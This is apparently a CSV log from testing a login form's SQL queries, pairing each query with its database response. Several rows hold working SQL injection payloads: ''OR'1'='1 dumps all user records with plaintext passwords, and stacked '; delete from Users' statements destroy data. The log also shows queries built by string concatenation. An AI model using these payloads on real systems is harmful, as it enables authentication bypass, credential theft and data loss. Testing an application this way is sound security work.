Query,Response
select * from Users where username='admin' and password='', []
select * from Users where username='sajid' and password='', []
select * from Users where username='sajid' and password='123456', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"}]
select * from Users where username='sajid' and password='123456', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"}]
select * from Users where username='sajid' and password='123456', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"}]
select * from Users where username='sajid' and password='123456', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"}]
select * from Users where username='105 OR 1=1' and password='105 OR 1=1', []
select * from Users where username='sajid' and password='123456', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"}]
select * from Users where username='admin' and password='', []
select * from Users where username='admin' and password='or 1=1', []
select * from Users where username='admin' and password='87364236786 or 1=1', []
select * from Users where username='sajid' and password='123456', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"}]
select * from Users where username='sajid' and password='123456 and 0', []
select * from Users where username='sajid' and password='1234560 or 1', []
select * from Users where username='sajid' and password='1234560 or 1', []
select * from Users where username='sajid' and password='1234560 or 1=1', []
select * from Users where username='sajid' and password='123456 or 1=1', []
select * from Users where username='sajid' and password='true', []
select * from Users where username='sajid' and password='true', []
select * from Users where username=''OR'1'='1' and password='123456', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"},{"uid":"5fde76b931639e0610f466er","username":"shourav","password":"123456"}]
select * from Users where username='sajid' and password=''OR'1'='1', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"},{"uid":"5fde76b931639e0610f466er","username":"shourav","password":"123456"},{"uid":"5fde76b931639e0610f46444","username":"admin","password":"123"}]
select * from Users where username='sasd' and password=''OR'1'='1', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"},{"uid":"5fde76b931639e0610f466er","username":"shourav","password":"123456"},{"uid":"5fde76b931639e0610f46444","username":"admin","password":"123"}]
select * from Users where username='sasd' and password='123456; delete from Users where username = shachi', []
select * from Users where username='sasd' and password='123456'; delete from Users where username = 'shachi', undefined
select * from Users where username='sajid' and password='123456'; delete from Users where username = 'shachi', undefined
select * from Users where username='Shachi123' and password='$or:''', []
select * from Users where username='Shachi123' and password='undefined', []
